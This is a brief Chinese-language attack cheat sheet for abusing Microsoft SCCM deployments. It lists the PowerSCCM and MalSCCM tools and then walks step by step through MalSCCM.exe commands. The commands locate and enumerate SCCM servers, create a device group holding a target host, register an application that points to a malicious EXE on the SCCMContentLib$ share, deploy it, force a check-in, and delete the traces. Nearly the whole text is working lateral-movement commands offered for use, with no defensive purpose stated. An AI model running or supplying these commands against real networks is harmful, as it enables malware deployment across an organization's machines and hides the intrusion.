	SCCM 是 Microsoft 提供的一种解决方案，用于以可扩展的方式在整个组织中增强管理。
	PowerSCCM - 与 SCCM 部署交互的 PowerShell 模块
	https://github.com/PowerShellMafia/PowerSCCM
	MalSCCM - 滥用本地或远程 SCCM 服务器将恶意应用程序部署到他们管理的主机
	https://github.com/nettitude/MalSCCM
	攻陷客户端，使用locate查找管理服务器
	>MalSCCM.exe locate
	以分发点管理员身​​份枚举 WMI
	>MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
	攻破管理服务器，使用locate查找主服务器
	在主服务器上使用 Inspect 查看可以定位的对象
	>MalSCCM.exe inspect /all
	>MalSCCM.exe inspect /computers
	>MalSCCM.exe inspect /primaryusers
	>MalSCCM.exe inspect /groups
	为想横向移动的机器创建一个新设备组
	>MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
	>MalSCCM.exe inspect /groups
	将您的目标添加到新组中
	>MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
	在可读共享上创建一个指向恶意 EXE 的应用程序：SCCMContentLib$
	>MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
	>MalSCCM.exe inspect /applications
	将应用程序部署到目标组
	>MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
	>MalSCCM.exe inspect /deployments
	强制目标组检查更新
	>MalSCCM.exe checkin /groupname:TargetGroup
	清理应用程序、部署和组
	>MalSCCM.exe app /cleanup /name:demoapp
	>MalSCCM.exe group /delete /groupname:TargetGroup